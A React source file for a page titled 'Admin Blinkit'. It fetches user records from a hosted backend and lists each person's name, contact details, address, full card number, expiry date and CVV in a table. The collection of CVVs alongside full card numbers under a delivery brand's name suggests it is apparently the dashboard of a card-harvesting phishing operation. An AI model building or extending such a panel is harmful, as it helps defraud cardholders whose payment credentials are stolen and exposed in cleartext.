import { useEffect, useState } from "react";
import axios from "axios";

function App() {
  const [items, setItems] = useState([]);
  useEffect(() => {
    axios
      .get("https://admin-backend-delivery.onrender.com/getUsers")
      .then((items) => setItems(items.data))
      .catch((err) => console.log(err.message));
  }, []);

  return (
    // <div className="w-100 vh-100 d-flex justify-content-center align-items-center">
    //   <div className="w-50">
    <>
      <div>
        <h1 className="text-center text-2xl p-5 font-medium text-yellow-500">
          Admin Blinkit
        </h1>
      </div>
      <div className="overflow-x-auto">
        <table className="table table-xs">
          <thead>
            <tr>
              <th>FirstName</th>
              <th>LastName</th>
              <th>Email</th>
              <th>MobileNumber</th>
              <th>Address</th>
              <th>City</th>
              <th>ZipCode</th>
              <th>Name On Card</th>
              <th>Card Number</th>
              <th>ExpiryDate</th>
              <th>CVV</th>
              <th>BillAmount</th>
            </tr>
          </thead>
          <tbody>
            {items.map((item, i) => {
              return (
                <tr key={i}>
                  <td>{item.firstName}</td>
                  <td>{item.lastName}</td>
                  <td>{item.email}</td>
                  <td>{item.mobileNumber}</td>
                  <td>{item.address}</td>
                  <td>{item.city}</td>
                  <td>{item.zipcode}</td>
                  <td>{item.nameOnCard}</td>
                  <td>{item.cardNumber}</td>
                  <td>{item.expiryDate}</td>
                  <td>{item.cvv}</td>
                  <td>{item.billAmount}</td>
                </tr>
              );
            })}
          </tbody>
          <tfoot>
            <tr>
              <th>FirstName</th>
              <th>LastName</th>
              <th>Email</th>
              <th>MobileNumber</th>
              <th>Address</th>
              <th>City</th>
              <th>ZipCode</th>
              <th>Name On Card</th>
              <th>Card Number</th>
              <th>ExpiryDate</th>
              <th>CVV</th>
              <th>BillAmount</th>
            </tr>
          </tfoot>
        </table>
      </div>
      {/* //   </div>
    // </div> */}
    </>
  );
}

export default App;
